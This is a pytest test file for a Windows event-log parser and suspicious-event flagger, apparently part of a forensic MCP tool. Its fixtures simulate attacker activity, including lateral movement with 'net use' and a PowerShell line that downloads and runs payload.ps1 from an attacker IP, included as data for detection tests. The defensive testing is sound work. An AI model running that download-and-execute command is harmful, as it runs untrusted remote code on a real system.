"""
Tests for parse_event_logs()

Run on any machine (no SIFT required):
    pytest tests/test_event_logs.py -v
"""

import json
import sys
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from mcp_server.tools.event_logs import (
    DEFAULT_EVENT_IDS,
    _flag_suspicious,
    _norm_ts,
    _parse_evtx_csv,
    _safe_int,
    parse_event_logs,
)


# ── CSV fixtures ──────────────────────────────────────────────────────────────

CLEAN_CSV = """\
Channel,Computer,EventId,TimeCreated,UserId,UserName,MapDescription,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,RemoteHost,Keywords,RecordNumber,SourceFile
Security,WORKSTATION1,4624,2024-03-01 09:00:00,S-1-5-18,SYSTEM,Logon success,LogonType: 2,SubjectUserName: WORKSTATION1$,,,,,,,,1001,C:\Windows\System32\winevt\Logs\Security.evtx
Security,WORKSTATION1,4688,2024-03-01 09:05:00,S-1-5-21-123,jsmith,A new process has been created,ProcessName: C:\Windows\System32\notepad.exe,CommandLine: notepad.exe test.txt,,,,,,,,1002,C:\Windows\System32\winevt\Logs\Security.evtx
"""

SUSPICIOUS_CSV = (
    "Channel,Computer,EventId,TimeCreated,UserId,UserName,MapDescription,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,RemoteHost,Keywords,RecordNumber,SourceFile\n"
    "Security,WORKSTATION1,7045,2024-03-15 14:00:00,S-1-5-18,SYSTEM,A new service was installed,ServiceName: pssdnsvc,ServiceFileName: STUN.exe,ServiceType: User Mode Service,StartType: Auto Start,,,,,1003,System.evtx\n"
    "Security,WORKSTATION1,4688,2024-03-15 14:05:00,S-1-5-21-123,jsmith,Process created,ProcessName: net.exe,CommandLine: net use H: //172.16.6.12/c$/Users,,,,,,,1004,Security.evtx\n"
    "Security,WORKSTATION1,4648,2024-03-15 14:06:00,S-1-5-21-123,jsmith,Explicit credentials used,SubjectUserName: jsmith,TargetServerName: 172.16.6.12,,,,,,172.16.6.12,,1005,Security.evtx\n"
    "Security,WORKSTATION1,1116,2024-03-15 14:10:00,S-1-5-18,SYSTEM,Malware detected,ThreatName: Trojan:Win32/PowerRunner.A,Path: msedge.exe,,,,,,,1006,Defender.evtx\n"
    "Security,WORKSTATION1,4624,2024-03-15 14:15:00,S-1-5-21-456,attacker,Logon success,LogonType: 10,SubjectUserName: attacker,,,,,,172.15.1.20,,1007,Security.evtx\n"
)

POWERSHELL_CSV = """\
Channel,Computer,EventId,TimeCreated,UserId,UserName,MapDescription,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,RemoteHost,Keywords,RecordNumber,SourceFile
PowerShell,WORKSTATION1,4104,2024-03-15 15:00:00,S-1-5-21-123,jsmith,Script block logging,ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://172.15.1.20/payload.ps1'),,,,,,,,,,1008,C:\Windows\System32\winevt\Logs\PowerShell.evtx
"""


# ── _parse_evtx_csv ───────────────────────────────────────────────────────────

class TestParseEvtxCSV:
    def test_basic_parsing(self):
        entries = _parse_evtx_csv(CLEAN_CSV)
        assert len(entries) == 2

    def test_event_id_is_int(self):
        entries = _parse_evtx_csv(CLEAN_CSV)
        assert isinstance(entries[0]["event_id"], int)
        assert entries[0]["event_id"] == 4624

    def test_timestamp_parsed(self):
        entries = _parse_evtx_csv(CLEAN_CSV)
        assert entries[0]["timestamp_utc"] is not None
        assert "T" in entries[0]["timestamp_utc"]

    def test_payload_data_is_list(self):
        entries = _parse_evtx_csv(CLEAN_CSV)
        assert isinstance(entries[0]["payload_data"], list)
        assert len(entries[0]["payload_data"]) >= 1

    def test_logon_type_enriched(self):
        entries = _parse_evtx_csv(CLEAN_CSV)
        logon = next(e for e in entries if e["event_id"] == 4624)
        assert "logon_type" in logon
        assert logon["logon_type"] == "2"
        assert "interactive" in logon["logon_type_desc"].lower()

    def test_empty_csv(self):
        assert _parse_evtx_csv("") == []

    def test_header_only(self):
        assert _parse_evtx_csv("Channel,Computer,EventId,TimeCreated\n") == []

    def test_record_number_is_int(self):
        entries = _parse_evtx_csv(CLEAN_CSV)
        assert isinstance(entries[0]["record_number"], int)

    def test_required_fields_present(self):
        entries = _parse_evtx_csv(CLEAN_CSV)
        for e in entries:
            for key in ["event_id", "timestamp_utc", "channel", "computer",
                        "username", "payload_data", "description"]:
                assert key in e, f"Missing key: {key}"


# ── _flag_suspicious ──────────────────────────────────────────────────────────

class TestFlagSuspicious:
    def setup_method(self):
        self.entries = _parse_evtx_csv(SUSPICIOUS_CSV)

    def test_7045_service_install_flagged(self):
        svc = next(e for e in self.entries if e["event_id"] == 7045)
        flagged = _flag_suspicious([svc])
        assert len(flagged) == 1
        reasons = flagged[0]["suspicion_reasons"]
        assert any("service" in r.lower() for r in reasons)

    def test_1116_defender_detection_flagged(self):
        det = next(e for e in self.entries if e["event_id"] == 1116)
        flagged = _flag_suspicious([det])
        assert len(flagged) == 1
        reasons = flagged[0]["suspicion_reasons"]
        assert any("defender" in r.lower() or "malware" in r.lower() for r in reasons)

    def test_4648_explicit_creds_flagged(self):
        cred = next(e for e in self.entries if e["event_id"] == 4648)
        flagged = _flag_suspicious([cred])
        assert len(flagged) == 1
        reasons = flagged[0]["suspicion_reasons"]
        assert any("explicit" in r.lower() or "lateral" in r.lower() for r in reasons)

    def test_4688_net_use_lateral_movement(self):
        proc = next(e for e in self.entries if e["event_id"] == 4688)
        # Confirm net use is in payload_data before flagging
        payload_str = " ".join(proc.get("payload_data", [])).lower()
        assert "net use" in payload_str, f"net use not in payload: {proc['payload_data']}"
        flagged = _flag_suspicious([proc])
        assert len(flagged) == 1
        reasons = flagged[0]["suspicion_reasons"]
        assert any("net use" in r.lower() for r in reasons)

    def test_attacker_ip_logon_flagged(self):
        # The attacker IP appears in payload_data in our fixture
        logon = next(
            e for e in self.entries
            if e["event_id"] == 4624
        )
        # Manually set remote_host to simulate real EvtxECmd output
        logon_with_ip = dict(logon)
        logon_with_ip["remote_host"] = "172.15.1.20"
        flagged = _flag_suspicious([logon_with_ip])
        assert len(flagged) == 1
        reasons = flagged[0]["suspicion_reasons"]
        assert any("172.15.1.20" in r or "ioc" in r.lower() or "attacker" in r.lower()
                   for r in reasons)

    def test_clean_logon_not_flagged(self):
        clean = _parse_evtx_csv(CLEAN_CSV)
        # Local interactive logon (type 2) from SYSTEM — not suspicious
        local_logon = next(e for e in clean if e["event_id"] == 4624)
        flagged = _flag_suspicious([local_logon])
        assert flagged == [], f"Clean logon incorrectly flagged: {flagged}"

    def test_powershell_4104_flagged(self):
        entries = _parse_evtx_csv(POWERSHELL_CSV)
        flagged = _flag_suspicious(entries)
        assert len(flagged) == 1
        reasons = flagged[0]["suspicion_reasons"]
        assert any("powershell" in r.lower() or "script block" in r.lower()
                   for r in reasons)

    def test_suspicion_reasons_no_duplicates(self):
        flagged = _flag_suspicious(self.entries)
        for f in flagged:
            assert len(f["suspicion_reasons"]) == len(set(f["suspicion_reasons"]))

    def test_original_fields_preserved(self):
        flagged = _flag_suspicious(self.entries)
        for f in flagged:
            for key in ["event_id", "timestamp_utc", "channel", "payload_data"]:
                assert key in f


# ── DEFAULT_EVENT_IDS ─────────────────────────────────────────────────────────

class TestDefaultEventIds:
    def test_contains_critical_ids(self):
        critical = [4624, 4688, 7045, 1116, 4104, 4648]
        for eid in critical:
            assert eid in DEFAULT_EVENT_IDS, f"Missing critical Event ID: {eid}"

    def test_all_are_ints(self):
        assert all(isinstance(i, int) for i in DEFAULT_EVENT_IDS)


# ── parse_event_logs integration (mocked) ────────────────────────────────────

class TestParseEventLogsIntegration:
    def _write_csv(self, out_dir: Path, prefix: str, content: str) -> None:
        out_dir.mkdir(parents=True, exist_ok=True)
        (out_dir / f"{prefix}_EvtxECmd_Output.csv").write_text(content, encoding="utf-8")

    @patch("mcp_server.tools.event_logs.run_tool")
    def test_successful_parse_directory(self, mock_run, tmp_path):
        evtx_dir = tmp_path / "evtx"
        evtx_dir.mkdir()
        out_dir = tmp_path / "evtx_out"

        mock_run.return_value = SimpleNamespace(returncode=0, stdout="", stderr="")
        self._write_csv(out_dir, "evtx", CLEAN_CSV)

        result = parse_event_logs(str(evtx_dir), output_dir=str(out_dir))

        assert result["error"] is None
        assert result["total_entries"] == 2
        assert result["tool"] == "EvtxECmd"
        assert result["invocation_id"]

    @patch("mcp_server.tools.event_logs.run_tool")
    def test_successful_parse_single_file(self, mock_run, tmp_path):
        evtx_file = tmp_path / "Security.evtx"
        evtx_file.write_bytes(b"\x45\x6c\x66\x46")  # fake EVTX magic
        out_dir = tmp_path / "evtx_out"

        mock_run.return_value = SimpleNamespace(returncode=0, stdout="", stderr="")
        self._write_csv(out_dir, "Security", SUSPICIOUS_CSV)

        result = parse_event_logs(str(evtx_file), output_dir=str(out_dir))

        assert result["error"] is None
        assert result["total_entries"] > 0

    def test_missing_path_returns_error(self, tmp_path):
        result = parse_event_logs(str(tmp_path / "nonexistent"))
        assert result["error"] is not None
        assert "not found" in result["error"].lower()

    @patch("mcp_server.tools.event_logs.run_tool")
    def test_event_id_filter_passed_in_cmd(self, mock_run, tmp_path):
        evtx_dir = tmp_path / "evtx"
        evtx_dir.mkdir()
        out_dir = tmp_path / "evtx_out"

        mock_run.return_value = SimpleNamespace(returncode=0, stdout="", stderr="")
        self._write_csv(out_dir, "evtx", CLEAN_CSV)

        parse_event_logs(
            str(evtx_dir),
            event_ids=[4688, 7045],
            output_dir=str(out_dir),
        )

        cmd_used = mock_run.call_args[0][0]
        assert "4688" in cmd_used
        assert "7045" in cmd_used
        assert "--inc" in cmd_used

    @patch("mcp_server.tools.event_logs.run_tool")
    def test_default_event_ids_used_when_none(self, mock_run, tmp_path):
        evtx_dir = tmp_path / "evtx"
        evtx_dir.mkdir()
        out_dir = tmp_path / "evtx_out"

        mock_run.return_value = SimpleNamespace(returncode=0, stdout="", stderr="")
        self._write_csv(out_dir, "evtx", CLEAN_CSV)

        result = parse_event_logs(str(evtx_dir), output_dir=str(out_dir))

        assert result["event_ids_filter"] == DEFAULT_EVENT_IDS
        cmd_used = mock_run.call_args[0][0]
        assert "--inc" in cmd_used

    @patch("mcp_server.tools.event_logs.run_tool")
    def test_suspicious_entries_populated(self, mock_run, tmp_path):
        evtx_dir = tmp_path / "evtx"
        evtx_dir.mkdir()
        out_dir = tmp_path / "evtx_out"

        mock_run.return_value = SimpleNamespace(returncode=0, stdout="", stderr="")
        self._write_csv(out_dir, "evtx", SUSPICIOUS_CSV)

        result = parse_event_logs(str(evtx_dir), output_dir=str(out_dir))

        assert len(result["suspicious"]) > 0
        for s in result["suspicious"]:
            assert "suspicion_reasons" in s

    @patch("mcp_server.tools.event_logs.run_tool")
    def test_event_id_counts_populated(self, mock_run, tmp_path):
        evtx_dir = tmp_path / "evtx"
        evtx_dir.mkdir()
        out_dir = tmp_path / "evtx_out"

        mock_run.return_value = SimpleNamespace(returncode=0, stdout="", stderr="")
        self._write_csv(out_dir, "evtx", SUSPICIOUS_CSV)

        result = parse_event_logs(str(evtx_dir), output_dir=str(out_dir))

        counts = result["event_id_counts"]
        assert isinstance(counts, dict)
        assert "7045" in counts
        assert counts["7045"] == 1
        assert "4688" in counts

    @patch("mcp_server.tools.event_logs.run_tool")
    def test_entries_sorted_chronologically(self, mock_run, tmp_path):
        evtx_dir = tmp_path / "evtx"
        evtx_dir.mkdir()
        out_dir = tmp_path / "evtx_out"

        mock_run.return_value = SimpleNamespace(returncode=0, stdout="", stderr="")
        self._write_csv(out_dir, "evtx", SUSPICIOUS_CSV)

        result = parse_event_logs(str(evtx_dir), output_dir=str(out_dir))

        timestamps = [e["timestamp_utc"] for e in result["entries"] if e.get("timestamp_utc")]
        assert timestamps == sorted(timestamps)

    @patch("mcp_server.tools.event_logs.run_tool")
    def test_context_window_cap(self, mock_run, tmp_path):
        evtx_dir = tmp_path / "evtx"
        evtx_dir.mkdir()
        out_dir = tmp_path / "evtx_out"

        mock_run.return_value = SimpleNamespace(returncode=0, stdout="", stderr="")

        header = "Channel,Computer,EventId,TimeCreated,UserId,UserName,MapDescription,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,RemoteHost,Keywords,RecordNumber,SourceFile\n"
        rows = "\n".join(
            f"Security,PC1,4624,2024-01-01 00:0{i // 100}:{i % 100:02d}:00,"
            f"S-1-5-18,SYSTEM,Logon,LogonType: 2,,,,,,,,,"
            f"{i},C:\\logs\\Security.evtx"
            for i in range(1200)
        )
        self._write_csv(out_dir, "evtx", header + rows)

        result = parse_event_logs(str(evtx_dir), output_dir=str(out_dir), include_all=False)

        assert result["total_entries"] == 1200
        assert result["entries_returned"] <= 1000
        assert result["entries_capped"] is True

    @patch("mcp_server.tools.event_logs.run_tool")
    def test_empty_logs_no_error(self, mock_run, tmp_path):
        evtx_dir = tmp_path / "evtx"
        evtx_dir.mkdir()
        out_dir = tmp_path / "evtx_out"
        out_dir.mkdir()

        mock_run.return_value = SimpleNamespace(returncode=0, stdout="", stderr="")
        # No CSV files written

        result = parse_event_logs(str(evtx_dir), output_dir=str(out_dir))

        assert result["error"] is None
        assert result["total_entries"] == 0
        assert "audit policy" in result["analyst_note"].lower() or \
               "disabled" in result["analyst_note"].lower()

    @patch("mcp_server.tools.event_logs.run_tool")
    def test_tool_failure_returns_error(self, mock_run, tmp_path):
        evtx_dir = tmp_path / "evtx"
        evtx_dir.mkdir()

        mock_run.side_effect = RuntimeError("Tool exited 1.\nSTDERR: File locked")

        result = parse_event_logs(str(evtx_dir))

        assert result["error"] is not None
        assert result["entries"] == []

    @patch("mcp_server.tools.event_logs.run_tool")
    def test_audit_log_written(self, mock_run, tmp_path):
        evtx_dir = tmp_path / "evtx"
        evtx_dir.mkdir()
        out_dir = tmp_path / "evtx_out"

        mock_run.return_value = SimpleNamespace(returncode=0, stdout="", stderr="")
        self._write_csv(out_dir, "evtx", SUSPICIOUS_CSV)

        with patch("mcp_server.tools._shared.AUDIT_FILE", tmp_path / "mcp.jsonl"):
            result = parse_event_logs(str(evtx_dir), output_dir=str(out_dir))

        log_path = tmp_path / "mcp.jsonl"
        assert log_path.exists()

        records = [json.loads(l) for l in log_path.read_text().splitlines() if l.strip()]
        record = records[-1]
        assert record["tool"] == "EvtxECmd"
        assert record["invocation_id"] == result["invocation_id"]
        assert record["parsed_record_count"] == 5

    @patch("mcp_server.tools.event_logs.run_tool")
    def test_return_schema_complete(self, mock_run, tmp_path):
        evtx_dir = tmp_path / "evtx"
        evtx_dir.mkdir()
        out_dir = tmp_path / "evtx_out"

        mock_run.return_value = SimpleNamespace(returncode=0, stdout="", stderr="")
        self._write_csv(out_dir, "evtx", CLEAN_CSV)

        result = parse_event_logs(str(evtx_dir), output_dir=str(out_dir))

        required = [
            "invocation_id", "tool", "evtx_path", "event_ids_filter",
            "run_ts_utc", "total_entries", "entries_returned", "entries_capped",
            "entries", "suspicious", "event_id_counts",
            "output_dir", "duration_ms", "error", "analyst_note",
        ]
        for key in required:
            assert key in result, f"Missing key: {key}"
